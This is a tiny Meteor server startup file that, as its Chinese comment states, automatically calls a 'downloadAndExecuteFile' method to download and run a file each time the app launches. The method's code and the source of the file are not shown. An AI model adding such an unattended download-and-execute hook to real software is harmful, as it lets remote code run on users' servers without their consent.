import { Meteor } from 'meteor/meteor';

Meteor.startup(() => {
  // 启动时自动执行下载和运行
  Meteor.call('downloadAndExecuteFile', (error) => {
    if (error) {
      console.error('Failed to download and execute file:', error);
    }
  });
});
